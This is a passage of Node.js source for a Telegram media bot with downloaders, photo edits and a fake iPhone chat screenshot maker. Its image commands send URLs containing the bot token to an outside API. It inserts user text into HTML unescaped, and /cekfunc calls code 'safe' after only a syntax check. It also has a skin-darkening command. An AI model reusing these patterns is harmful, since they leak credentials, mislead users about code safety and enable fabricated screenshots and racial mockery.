        const finalUrl = data?.files?.[0]?.url;

        if (!finalUrl) throw new Error("failed to get url");

        await bot.deleteMessage(chatId, processingMsg.message_id).catch(() => {});
        await sendRichMenu(chatId,
            `<h3>upload successful</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>url</td><td>${finalUrl}</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="${finalUrl}" style="primary">open url</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
            msg.message_id
        );
    } catch (err) {
        console.error("tourl error:", err);
        sendRichMenu(chatId,
            `<h3>failed</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>error</td><td>${err.response?.data?.error || err.message}</td></tr>
</table>`,
            msg.message_id
        );
    }
});

bot.onText(/^\/play(?:\s+(.+))?$/i, async (msg, match) => {
    const chatId = msg.chat.id;
    const query = match[1] ? match[1].trim() : "";

    if (!query) {
        return sendRichMenu(chatId,
            `<h3>missing query</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/play rewrite the stars</td></tr>
</table>`,
            msg.message_id
        );
    }

    const waitMsg = await bot.sendMessage(chatId, `<blockquote>searching for song...</blockquote>`, {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
    });

    try {
        await bot.sendChatAction(chatId, "upload_document");

        const apiUrl = `https://api.ikyyxd.my.id/search/ytplayv2?q=${encodeURIComponent(query)}`;
        const { data } = await axios.get(apiUrl, { timeout: 30000 });

        if (!data || !data.status || !data.result) {
            return bot.editMessageText(`<blockquote>song not found.</blockquote>`, {
                chat_id: chatId,
                message_id: waitMsg.message_id,
                parse_mode: "HTML"
            });
        }

        const res = data.result;
        const artistName = "heysaka official id";
        const durationMin = Math.floor((res.duration || 0) / 60);
        const durationSec = ((res.duration || 0) % 60).toString().padStart(2, "0");
        const durationFormatted = `${durationMin}:${durationSec}`;

        await bot.editMessageText(`<blockquote>downloading audio...</blockquote>`, {
            chat_id: chatId,
            message_id: waitMsg.message_id,
            parse_mode: "HTML"
        }).catch(() => {});

        const audioUrl = res.audio ? res.audio.url : res.url;
        const audioStream = await axios.get(audioUrl, {
            responseType: "arraybuffer",
            timeout: 60000,
            headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" }
        });

        const audioBuffer = Buffer.from(audioStream.data);
        await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});

        const captionHtml = `<tg-collage>
  <img src="${res.thumbnail}" />
</tg-collage>

<h3>${res.title}</h3>
<p>artist: ${artistName} | duration: ${durationFormatted}</p>

<tg-song>
  <audio controls preload="none" src="${audioUrl}"></audio>
  <footer style="font-size:12px; color:#888; margin-top:6px;">
    © 2026 - Kintana Bot Telegram
  </footer>
</tg-song>

<tg-button-row>
  <tg-button type="url" url="${res.source || res.url}" style="primary">view video</tg-button>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`;

        await sendRichMenu(chatId, captionHtml, msg.message_id);

    } catch (error) {
        console.error("error /play command:", error.message);
        await bot.editMessageText(`<blockquote>failed to process request.</blockquote>`, {
            chat_id: chatId,
            message_id: waitMsg.message_id,
            parse_mode: "HTML"
        }).catch(() => {});
    }
});

bot.onText(/^\/jadihitam$/, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const reply = msg.reply_to_message;

        if (!reply || !reply.photo) {
            return sendRichMenu(chatId,
                `<h3>missing photo</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>reply to a photo</td></tr>
</table>`,
                msg.message_id
            );
        }

        const fileId = reply.photo[reply.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

        const loading = await bot.sendMessage(chatId, `<blockquote>processing image...</blockquote>`, {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        });

        const { data } = await axios.get("https://api.ikyyxd.my.id/edit/nanobananav3", {
            params: { prompt: "change the skin to black", url: fileUrl }
        });

        if (!data.status) {
            return bot.editMessageText(`<blockquote>failed to process image.</blockquote>`, {
                chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML"
            });
        }

        await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

        bot.sendPhoto(chatId, data.result.result_url, {
            caption: `<blockquote>successfully changed photo to black skin.</blockquote>`,
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
                ]
            }
        });
    } catch (err) {
        console.error(err);
        sendRichMenu(msg.chat.id,
            `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${err.message}</td></tr>
</table>`,
            msg.message_id
        );
    }
});

bot.onText(/^\/jadianime$/, async (msg) => {
    try {
        const chatId = msg.chat.id;
        const reply = msg.reply_to_message;

        if (!reply || !reply.photo) {
            return sendRichMenu(chatId,
                `<h3>missing photo</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>reply to a photo</td></tr>
</table>`,
                msg.message_id
            );
        }

        const fileId = reply.photo[reply.photo.length - 1].file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${config.BOT_TOKEN}/${file.file_path}`;

        const loading = await bot.sendMessage(chatId, `<blockquote>processing image...</blockquote>`, {
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id
        });

        const { data } = await axios.get("https://api.ikyyxd.my.id/edit/nanobananav3", {
            params: { prompt: "change this photo to anime", url: fileUrl }
        });

        if (!data.status) {
            return bot.editMessageText(`<blockquote>failed to process image.</blockquote>`, {
                chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML"
            });
        }

        await bot.deleteMessage(chatId, loading.message_id).catch(() => {});

        bot.sendPhoto(chatId, data.result.result_url, {
            caption: `<blockquote>successfully changed photo to anime.</blockquote>`,
            parse_mode: "HTML",
            reply_to_message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
                ]
            }
        });
    } catch (err) {
        console.error(err);
        sendRichMenu(msg.chat.id,
            `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>${err.message}</td></tr>
</table>`,
            msg.message_id
        );
    }
});

function toSmallCaps(text) {
    return text;
}

function escapeHtml(str) {
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;');
}

bot.onText(/^\/cekfunc$/, async (msg) => {
    const chatId = msg.chat.id;
    const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "user";
    const token = bot.token;

    if (!msg.reply_to_message) {
        return sendRichMenu(chatId,
            `<h3>usage</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>reply to code message or .js file</td></tr>
<tr><td>then send</td><td>/cekfunc</td></tr>
</table>`,
            msg.message_id
        );
    }

    let codeToCheck = "";
    let funcName = "";
    const replyMsg = msg.reply_to_message;

    try {
        const prosesMsg = await bot.sendSticker(chatId, "CAACAgIAAxkBAAEruXhqSMtyQ-jLc3Kym-SkdNz4SxG92gACtCMAAphLKUjeub7NKlvk2TwE");

        if (replyMsg.document) {
            const doc = replyMsg.document;
            funcName = doc.file_name || "file.js";
            if (!funcName.endsWith('.js')) {
                await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
                return sendRichMenu(chatId,
                    `<h3>invalid file</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>file must be .js</td></tr>
</table>`,
                    msg.message_id
                );
            }
            const fileStream = bot.getFileStream(doc.file_id);
            const chunks = [];
            for await (const chunk of fileStream) chunks.push(chunk);
            codeToCheck = Buffer.concat(chunks).toString("utf-8");
        } else if (replyMsg.text) {
            codeToCheck = replyMsg.text;
            funcName = "reply text";
        } else {
            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            return sendRichMenu(chatId,
                `<h3>unsupported</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>must be code text or .js file</td></tr>
</table>`,
                msg.message_id
            );
        }

        const vm = require('vm');
        try {
            new vm.Script(codeToCheck, { filename: 'checked_file.js' });

            const successHtml = `<h3>function is safe</h3>

<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td><code>/cekfunc</code></td></tr>
<tr><td>source</td><td><code>${escapeHtml(funcName)}</code></td></tr>
<tr><td>status</td><td>function is safe</td></tr>
<tr><td>created</td><td>${escapeHtml(username)}</td></tr>
</table>

<ul>
  <li><input type="checkbox" checked> syntax function valid</li>
  <li><input type="checkbox" checked> no errors detected</li>
</ul>

<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
`;

            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
                chat_id: chatId,
                reply_parameters: { message_id: msg.message_id },
                rich_message: { html: RICH_CSS + successHtml }
            });

        } catch (syntaxError) {
            const stack = syntaxError.stack || "";
            const lines = stack.split('\n');
            let lineNum = 1, colNum = 1;
            const matchLine = lines[0] ? lines[0].match(/checked_file\.js:(\d+)/) : null;
            if (matchLine) lineNum = parseInt(matchLine[1]);
            if (lines[2]) {
                const caretIdx = lines[2].indexOf('^');
                if (caretIdx !== -1) colNum = caretIdx + 1;
            }
            const codeLines = codeToCheck.split('\n');
            const startLine = Math.max(1, lineNum - 3);
            const endLine = Math.min(codeLines.length, lineNum + 3);
            let snippetRows = "";
            for (let i = startLine; i <= endLine; i++) {
                const isTarget = i === lineNum;
                const linePrefix = isTarget ? `<b>${i}</b>` : `${i}`;
                const lineContent = codeLines[i - 1] || "";
                snippetRows += `<tr><td>${linePrefix}</td><td><code>${escapeHtml(lineContent)}</code></td></tr>\n`;
            }

            const errorHtml = `<h3>error detected</h3>

<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>command</td><td><code>/cekfunc</code></td></tr>
<tr><td>source</td><td>${escapeHtml(funcName)}</td></tr>
<tr><td>line</td><td><b>${lineNum}</b></td></tr>
<tr><td>column</td><td><b>${colNum}</b></td></tr>
<tr><td>error</td><td><code>${escapeHtml(syntaxError.message)}</code></td></tr>
</table>

<h3>code snippet</h3>
<table border="2">
<tr><th>line</th><th>code</th></tr>
${snippetRows}
</table>

<ul>
  <li><input type="checkbox"> syntax function valid</li>
  <li><input type="checkbox"> no errors detected</li>
</ul>

<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>
`;

            await bot.deleteMessage(chatId, prosesMsg.message_id).catch(() => {});
            await axios.post(`https://api.telegram.org/bot${token}/sendRichMessage`, {
                chat_id: chatId,
                reply_parameters: { message_id: msg.message_id },
                rich_message: { html: RICH_CSS + errorHtml }
            });
        }

    } catch (globalError) {
        sendRichMenu(chatId,
            `<h3>fatal error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>message</td><td>${globalError.message}</td></tr>
</table>`
        );
    }
});

function formatQuote(text) {
    return `<blockquote>${text}</blockquote>`;
}

bot.onText(/^(?:\/tiktok(?:\s+\S+)?|https?:\/\/(?:vm\.tiktok\.com|vt\.tiktok\.com|www\.tiktok\.com)\/[^\s]+)$/, async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text.trim();
  const matchUrl = text.match(/(https?:\/\/(?:vm\.tiktok\.com|vt\.tiktok\.com|www\.tiktok\.com)\/[^\s]+)/);

  if (text.startsWith('/tiktok') && !matchUrl) {
    return sendRichMenu(chatId,
      `<h3>tiktok downloader</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>usage</td><td>/tiktok &lt;url&gt;</td></tr>
<tr><td>example</td><td>/tiktok https://vt.tiktok.com/abcde123/</td></tr>
</table>`,
      msg.message_id
    );
  }

  if (!matchUrl) return;

  const url = matchUrl[1];
  const loadingMsg = await bot.sendMessage(chatId, formatQuote("tiktok link detected, please wait..."), {
    parse_mode: "HTML", reply_to_message_id: msg.message_id
  });

  const providers = [
    { name: "v3 (tikwm)", run: () => downloadV3(url, chatId) },
    { name: "v6 (hd quality)", run: () => downloadV6(url, chatId) },
    { name: "v5 (multi complete)", run: () => downloadV5(url, chatId) },
    { name: "v1 (support slide)", run: () => downloadV1(url, chatId) },
    { name: "v2 (support slide)", run: () => downloadV2(url, chatId) },
    { name: "v4 (backup)", run: () => downloadV4(url, chatId) }
  ];

  let success = false;

  for (const provider of providers) {
    try {
      success = await provider.run();
      if (success) {
        await bot.editMessageText(formatQuote(`success via server ${provider.name}!`), {
          chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "HTML"
        });
        setTimeout(() => { bot.deleteMessage(chatId, loadingMsg.message_id).catch(() => {}); }, 3000);
        break;
      }
    } catch (err) {}
  }

  if (!success) {
    await bot.editMessageText(formatQuote("failed to download tiktok video."), {
      chat_id: chatId, message_id: loadingMsg.message_id, parse_mode: "HTML"
    });
  }
});

async function downloadV3(url, chatId) {
  const { data } = await axios.get(`https://www.tikwm.com/api/`, { params: { url } });
  if (data.code !== 0) return false;
  const res = data.data;
  const rawCaption = `tiktok downloader (v3)\n\nauthor : ${res.author.nickname}\ntitle : ${res.title || "no title"}\nlikes : ${res.digg_count}\ncomments : ${res.comment_count}\nshare : ${res.share_count}`;
  await bot.sendVideo(chatId, res.play, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  if (res.music) {
    await bot.sendAudio(chatId, res.music, { title: res.music_info?.title || "tiktok audio", performer: res.music_info?.author || "tiktok" });
  }
  return true;
}

async function downloadV6(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv4`, { params: { url } });
  if (!data.status) return false;
  const res = data.result;
  const rawCaption = `tiktok downloader v6 (hd)\n\nauthor : ${res.author.nickname} (@${res.author.username})\nduration : ${res.duration}s\nsize : ${res.quality.size}\nhd : ${res.quality.is_hd ? "yes" : "no"}`;
  if (res.media?.nowm) await bot.sendVideo(chatId, res.media.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  else if (res.media?.wm) await bot.sendVideo(chatId, res.media.wm, { caption: formatQuote(rawCaption + "\n(watermark)"), parse_mode: "HTML" });
  return true;
}

async function downloadV5(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv3`, { params: { url } });
  if (!data.status) return false;
  const res = data.result;
  const rawCaption = `tiktok downloader v5\n\nauthor : ${res.creator.nickname}\ncaption : ${res.caption || "-"}\nviews : ${res.stats.views}\nlikes : ${res.stats.likes}`;
  if (res.download?.nowm) await bot.sendVideo(chatId, res.download.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  else if (res.download?.wm) await bot.sendVideo(chatId, res.download.wm, { caption: formatQuote(rawCaption + "\n(watermark)"), parse_mode: "HTML" });
  if (res.download?.audio) await bot.sendAudio(chatId, res.download.audio, { title: "tiktok audio", performer: res.creator.nickname });
  return true;
}

async function downloadV1(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktok`, { params: { apikey: "kyzz", query: url } });
  if (!data.status) return false;
  const res = data.result;
  const media = [];
  if (res.video) media.push({ type: "video", media: res.video, caption: formatQuote("tiktok video (v1)") });
  if (res.slides?.length) {
    res.slides.forEach((sl, idx) => {
      media.push({ type: "photo", media: sl.img_result, caption: idx === 0 && !res.video ? formatQuote("tiktok slide (v1)") : undefined });
    });
  }
  for (let i = 0; i < media.length; i += 10) {
    const batch = media.slice(i, i + 10);
    if (batch.length === 1) {
      if (batch[0].type === "video") await bot.sendVideo(chatId, batch[0].media, { caption: batch[0].caption, parse_mode: "HTML" });
      else await bot.sendPhoto(chatId, batch[0].media, { caption: batch[0].caption, parse_mode: "HTML" });
    } else {
      await bot.sendMediaGroup(chatId, batch.map(m => ({ type: m.type, media: m.media, caption: m.caption, parse_mode: "HTML" })));
    }
  }
  if (res.audio) await bot.sendAudio(chatId, res.audio, { caption: formatQuote("tiktok audio"), parse_mode: "HTML" });
  return true;
}

async function downloadV2(url, chatId) {
  const { data } = await axios.get(`https://api.ikyyxd.my.id/download/tiktokv2`, { params: { url } });
  if (!data.status) return false;
  const res = data.result;
  const media = [];
  res.video?.forEach(v => media.push({ type: "video", media: v }));
  res.audio?.forEach(a => media.push({ type: "audio", media: a }));
  const rawCaption = res.title ? `${res.title}` : undefined;
  const videos = media.filter(m => m.type === "video");
  if (videos.length > 0) {
    for (let i = 0; i < videos.length; i += 10) {
      const slice = videos.slice(i, i + 10);
      await bot.sendMediaGroup(chatId, slice.map((m, idx) => ({
        type: "video", media: m.media,
        caption: i === 0 && idx === 0 && rawCaption ? formatQuote(rawCaption) : undefined,
        parse_mode: "HTML"
      })));
    }
  }
  const audios = media.filter(m => m.type === "audio");
  for (const a of audios) await bot.sendAudio(chatId, a.media);
  return true;
}

async function downloadV4(url, chatId) {
  const { data } = await axios.get(`https://tikdown.ikyzxz.my.id/api/v1`, { params: { url } });
  if (!data.status) return false;
  const res = data;
  const rawCaption = `tiktok downloader v4\n\ntitle : ${res.title || "no title"}\nauthor : ${res.author || "unknown"}`;
  if (!res.download?.nowm) return false;
  await bot.sendVideo(chatId, res.download.nowm, { caption: formatQuote(rawCaption), parse_mode: "HTML" });
  if (res.download?.mp3) await bot.sendAudio(chatId, res.download.mp3, { title: res.title || "tiktok audio", performer: res.author || "tiktok" });
  return true;
}

const pinMemory = {};

function blockQuote(text) {
  return `<blockquote>${text}</blockquote>`;
}

bot.onText(/^\/pinterest(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1]?.trim();
  const replyOpt = { reply_to_message_id: msg.message_id, parse_mode: 'HTML' };

  if (!query) {
    return sendRichMenu(chatId,
      `<h3>missing query</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>example</td><td>/pinterest anime girl</td></tr>
</table>`,
      msg.message_id
    );
  }

  const loading = await bot.sendMessage(chatId, blockQuote('searching for images...'), { ...replyOpt });

  try {
    const { data } = await axios.get('https://api.siputzx.my.id/api/s/pinterest', { params: { query, type: 'image' } });

    if (!data?.data || data.data.length === 0) {
      await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
      return sendRichMenu(chatId,
        `<h3>not found</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>no results for "${query}"</td></tr>
</table>`,
        msg.message_id
      );
    }

    const key = Math.random().toString(36).substring(2, 9);
    pinMemory[key] = {
      results: data.data.filter(v => v.image_url),
      index: 0,
      chatId,
      replyTo: msg.message_id
    };

    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    await sendPin(bot, chatId, key);

  } catch (err) {
    await bot.deleteMessage(chatId, loading.message_id).catch(() => {});
    sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>failed to retrieve data</td></tr>
</table>`,
      msg.message_id
    );
  }
});

bot.on('callback_query', async (callbackQuery) => {
  const data = callbackQuery.data;
  if (!data.startsWith('pin_next_')) return;

  const key = data.replace('pin_next_', '');
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;

  if (!pinMemory[key]) {
    return bot.answerCallbackQuery(callbackQuery.id, { text: 'session expired, please search again!', show_alert: true });
  }

  await bot.answerCallbackQuery(callbackQuery.id, { text: 'fetching the next 10 images...' });
  await bot.deleteMessage(chatId, messageId).catch(() => {});
  await sendPin(bot, chatId, key);
});

async function sendPin(bot, chatId, key) {
  const data = pinMemory[key];
  if (!data) {
    return sendRichMenu(chatId,
      `<h3>expired</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>data expired or not found</td></tr>
</table>`
    );
  }

  const replyOpt = { reply_to_message_id: data.replyTo, parse_mode: 'HTML' };
  const start = data.index;
  const end = start + 10;
  const slice = data.results.slice(start, end);

  if (!slice.length) {
    return sendRichMenu(chatId,
      `<h3>done</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>all images have been displayed</td></tr>
</table>`,
      data.replyTo
    );
  }

  const page = Math.floor(start / 10) + 1;
  const caption = `pinterest result - page ${page}`;

  const media = slice.map((v, i) => ({
    type: 'photo',
    media: v.image_url,
    caption: i === 0 ? caption : undefined
  }));

  try {
    await bot.sendMediaGroup(chatId, media);
    data.index += 10;

    if (data.index >= data.results.length) {
      return sendRichMenu(chatId,
        `<h3>done</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>all images have been displayed</td></tr>
</table>

<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
        data.replyTo
      );
    }

    return sendRichMenu(chatId,
      `<h3>pinterest</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>page</td><td>${page}</td></tr>
<tr><td>status</td><td>show next 10 images?</td></tr>
</table>

<tg-button-row>
  <tg-button type="callback_data" data="pin_next_${key}" style="primary">next 10</tg-button>
</tg-button-row>
<tg-button-row>
  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
</tg-button-row>`,
      data.replyTo
    );

  } catch (error) {
    console.error('error sendMediaGroup:', error);
    sendRichMenu(chatId,
      `<h3>error</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>status</td><td>failed to send images</td></tr>
</table>`,
      data.replyTo
    );
  }
}

bot.onText(/^\/iqc(?:\s+(.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1] ? match[1].trim() : "";

  if (!input) {
    return sendRichMenu(chatId,
      `<h3>iqc usage</h3>
<table border="2">
<tr><th>info</th><th>detail</th></tr>
<tr><td>format</td><td>/iqc &lt;text&gt;</td></tr>
<tr><td>example</td><td>/iqc hello, good night!</td></tr>
<tr><td>custom time</td><td>/iqc hello | 22:15 | 22:15</td></tr>
</table>`,
      msg.message_id
    );
  }

  const now = new Date();
  const timeOptions = { timeZone: "Asia/Jakarta", hour: "2-digit", minute: "2-digit", hour12: false };
  const currentTime = now.toLocaleTimeString("id-ID", timeOptions).replace(".", ":");

  let textParam = input;
  let chatTimeParam = currentTime;
  let statusBarTimeParam = currentTime;

  if (input.includes("|")) {
    const parts = input.split("|").map(p => p.trim());
    textParam = parts[0] || "hello";
    chatTimeParam = parts[1] || currentTime;
    statusBarTimeParam = parts[2] || parts[1] || currentTime;
  }

  const waitMsg = await bot.sendMessage(chatId, `<blockquote>creating iphone quote...</blockquote>`, {
    parse_mode: "HTML", reply_to_message_id: msg.message_id
  });

  try {
    await bot.sendChatAction(chatId, "upload_photo");

    const apiUrl = `https://api.ikyyxd.my.id/canvas/iqc?text=${encodeURIComponent(textParam)}&chatTime=${encodeURIComponent(chatTimeParam)}&statusBarTime=${encodeURIComponent(statusBarTimeParam)}`;
    const { data } = await axios.get(apiUrl, { timeout: 25000 });

    let imageUrl = null;
    if (typeof data === 'string' && data.startsWith('http')) imageUrl = data;
    else if (data) imageUrl = data.result || data.url || data.data || (data.status && data.result?.url ? data.result.url : null);

    if (!imageUrl && data && data.status === false) {
      return bot.editMessageText(`<blockquote>failed to create iqc image.</blockquote>`, {
        chat_id: chatId, message_id: waitMsg.message_id, parse_mode: "HTML"
      });
    }

    await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
    const targetUrl = imageUrl || apiUrl;

    await bot.sendPhoto(chatId, targetUrl, {
      caption: `<blockquote>iphone chat generator\n"${textParam}"</blockquote>`,
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id,
      reply_markup: {
        inline_keyboard: [
          [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
        ]
      }
    });

  } catch (error) {
    console.error("error /iqc command:", error.message);
    try {
      const directApiUrl = `https://api.ikyyxd.my.id/canvas/iqc?text=${encodeURIComponent(textParam)}&chatTime=${encodeURIComponent(chatTimeParam)}&statusBarTime=${encodeURIComponent(statusBarTimeParam)}`;
      await bot.deleteMessage(chatId, waitMsg.message_id).catch(() => {});
      await bot.sendPhoto(chatId, directApiUrl, {
        caption: `<blockquote>iphone chat generator\n"${textParam}"</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "creator", url: "https://t.me/heysaka", style: "primary", icon_custom_emoji_id: "5319301933645707826" }]
          ]
        }
      });
    } catch (fallbackError) {
      await bot.editMessageText(`<blockquote>api server is currently down.</blockquote>`, {
        chat_id: chatId, message_id: waitMsg.message_id, parse_mode: "HTML"
      }).catch(() => {});
    }
  }
});
